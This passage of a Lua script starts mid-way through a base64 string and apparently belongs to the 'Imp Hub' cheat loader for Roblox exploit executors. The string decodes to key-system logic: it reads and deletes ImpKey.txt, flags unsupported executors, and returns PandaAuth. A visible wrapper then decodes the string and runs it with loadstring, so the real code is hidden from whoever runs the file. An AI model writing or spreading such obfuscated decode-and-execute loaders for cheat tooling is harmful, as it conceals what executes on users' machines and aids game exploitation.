IG1heSBiZSBleHBpcmVkIG9yIGludmFsaWQgZHVlIHRvIGFuIEhXSUQgbWlzbWF0Y2guIElmIHlvdSByZWNlbnRseSBzd2l0Y2hlZCBvciByZWluc3RhbGxlZCBleGVjdXRvcnMsIHBsZWFzZSByZXNldCB5b3VyIGh3aWQsIHlvdSBjYW4gdHJ5IHZhbGlkYXRpbmcgYWdhaW4gZm9yIG1ha2Ugc3VyZSBpdHMga2V5IGVycm9yLCB0aGlzIGNhbiBiZSBhbHNvIHRoYXQgdGhlIGV4ZWN1dG9yIGFpbid0IHN1cHBvcnRpbmcgb3VyIGtleSBzeXN0ZW0gKG1vc3RseSBvZiBjYXNlcykuIgoJCQl9KQoJCWVuZAoJZW5kCmVuZAoKaWYgbm90IGlzTG9nZ2luZ0luIGFuZCBpc2ZpbGUgYW5kIHJlYWRmaWxlIGFuZCBpc2ZpbGUoIkltcEtleS50eHQiKSB0aGVuCglpZiBDaGVja0tleShyZWFkZmlsZSgiSW1wS2V5LnR4dCIpKSB0aGVuCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCVByb2dyZXNzOlNob3dUb2FzdCh7CgkJCQlUZXh0ID0gIlZhbGlkIEtleSBGcm9tIFN0b3JhZ2UhIiwKCQkJCUR1cmF0aW9uID0gMi43NQoJCQl9KQoJCQlUaGVTY3JpcHQoKQoJCWVuZCkKCWVsc2VpZiBkZWxmaWxlIHRoZW4KCQlkZWxmaWxlKCJJbXBLZXkudHh0IikKCWVuZAplbmQKCmlmIGlkZW50aWZ5ZXhlY3V0b3IgdGhlbgogICAgaWYgaWRlbnRpZnlleGVjdXRvcigpID09ICJTd2lmdCIgdGhlbgogICAgICAgIHRhc2suc3Bhd24od2luZG93LlNob3dEaWFsb2csIHdpbmRvdywgewoJCQkJVGl0bGUgPSAiRXhlY3V0b3IgTm90IFN1cHBvcnRlZCIsCgkJCQlUZXh0ID0gIlRoaXMgRXhlY3V0b3IgQWluJ3QgU3VwcG9ydGVkIEJ5IEltcCBIdWIgS2V5IFN5c3RlbSwgSWYgRG8gWW91IFdhbnQgQW55IE90aGVyIEZyZWUgV2luZG93cyBFeGVjdXRvciBPcHRpb24sIFUgQ2FuIFVzZSBBcmdvbi9DcnlwdGljIFdpbmRvd3MgV2hpY2ggQXJlIEFsc28gRnJlZS4iCgkJCX0pCiAgICBlbmQKZW5kCgpyZXR1cm4gUGFuZGFBdXRo"
local function decode_and_run()
    local decoded = base64.decode(SshEhIbiNX)
    local chunk = loadstring(decoded)
    if chunk then
        chunk()
    else
        error("Failed to decode and execute script")
    end
end
decode_and_run()
